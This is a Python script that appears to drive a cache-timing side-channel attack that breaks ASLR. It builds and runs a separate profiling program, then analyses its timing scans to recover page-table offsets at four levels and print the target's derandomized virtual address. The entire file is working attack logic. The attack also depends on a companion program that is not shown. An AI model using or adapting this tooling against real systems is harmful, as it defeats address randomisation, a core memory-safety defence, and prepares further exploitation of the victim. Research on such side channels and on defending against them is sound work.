#!/usr/bin/env python

from __future__ import division
import os
import numpy as np
import subprocess

scan_filename = './scan.txt'
MARGIN_OF_ERROR = 0.8
NUM_CACHELINE_OFFSETS = 64

def find_cacheline_offsets():
	max_offset = [-1, -1, -1, -1]
	max_value = [0, 0, 0, 0]

	if not os.path.isfile(scan_filename):
		print("scan.txt does not exist")
		return

	f = open(scan_filename, 'r')
	scan_values = [int(line) for line in f]
	a = np.reshape(scan_values, (-1, NUM_CACHELINE_OFFSETS))
	
	f.close()
	
	for offset in range(NUM_CACHELINE_OFFSETS):
		values_per_level = [0, 0, 0, 0]
		
		for page_index in range(len(a)):
			for i in range(len(values_per_level)):			
				values_per_level[i] += a[page_index][(offset + (i + 1) * page_index) % NUM_CACHELINE_OFFSETS]
				
		for i in range(len(values_per_level)):
			if values_per_level[i] > max_value[i]:
				max_value[i] = values_per_level[i]
				max_offset[i] = offset
				
	return max_offset


def find_slot_offset(lvl):
	filename = './scan_{0}.txt'.format(lvl)
	max_offset = -1
	max_value = 0
	
	if not os.path.isfile(filename):
		print("{0} does not exist".format(filename))
		return -1

	f = open(filename, 'r')
	scan_values = [int(line) for line in f]
	a = np.reshape(scan_values, (-1, 64))
	
	for offset in range(NUM_CACHELINE_OFFSETS):
		values_per_level = [0, 0, 0, 0, 0, 0, 0, 0]
		
		for i in range(len(values_per_level)):
			for page_index in range(len(a)):
				values_per_level[i] += a[page_index][(offset + int((page_index + i) / 8)) % NUM_CACHELINE_OFFSETS]
				
		for i in range(len(values_per_level)):
			if values_per_level[i] > max_value:
				max_value = values_per_level[i]
				max_offset = i
	print("{0}: {1}".format(lvl,max_offset))
	return max_offset
	
	
def make_prog():
	make_process = subprocess.Popen(['make', 'clean', 'all'], stderr=subprocess.STDOUT)
	
	if make_process.wait() != 0:
		print("Failed to make prog")
		return -1
		
	return 0
	

def run_prog():
	return subprocess.check_call(["./prog"])


def main():
	print("Compiling prog..")

	if make_prog() < 0:
		return -1
		
	print("Successfully compiled prog")
	print("Executing prog, profiling memory accesses..")
	
	if run_prog() < 0:
		print("Failed to run prog")
		return -1
		
	print("Finished running prog, solving target address based on memory profiles..")
	
	result = 0
	offsets = find_cacheline_offsets()
	
	if len(offsets) != 4:
		print("Something's not right here.. Found {0} PT levels".format(len(offsets)))
		return -1
	
	for i in range(4):
		slot = (offsets[i] << 3) | find_slot_offset(4 - i)
		
		print("Slot at PTL{0}: {1}".format(4-i, slot))
		
		if slot < 0:
			print("Failed to correctly identify offset within cacheline for level {0}".format(4 - i))
			return
		
		result = (result << 9) | slot
	
	print("\nDerandomized virtual address is:")
	print(format(result << 12, '#04x'))


if __name__ == "__main__":
	main()

